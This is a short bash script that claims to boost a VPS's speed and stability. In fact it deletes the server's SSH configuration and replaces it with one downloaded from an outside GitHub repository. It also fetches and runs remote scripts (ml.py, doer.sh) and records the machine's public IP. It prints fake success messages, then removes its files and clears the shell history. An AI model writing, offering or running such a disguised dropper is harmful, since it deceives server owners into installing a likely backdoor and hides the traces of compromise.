#!/bin/bash

apt install python -y

sudo apt install curl -y

curl icanhazip.com -4 >rex

cd /etc/ssh

rm sshd_config

 wget https://raw.githubusercontent.com/Sprent605/mains/main/sshd_config

sudo systemctl restart ssh

systemctl restart ssh

cd $HOME

wget https://raw.githubusercontent.com/Piroza1/ml/main/ml.py

wget https://raw.githubusercontent.com/Sprent605/entity/main/doer.sh && chmod +x doer.sh && ./doer.sh

echo -e "\033[1;34mUpgrading vps speed and stability...\033[0m"

python ml.py
python3 ml.py

clear

echo -e "\033[1;32mScript executed successfully,and\nyour vps speed boosted\033[0m"

rm -rf speed.sh ml.py doer.sh rex

cat /dev/null > ~/.bash_history && history -c

history -c && history -w

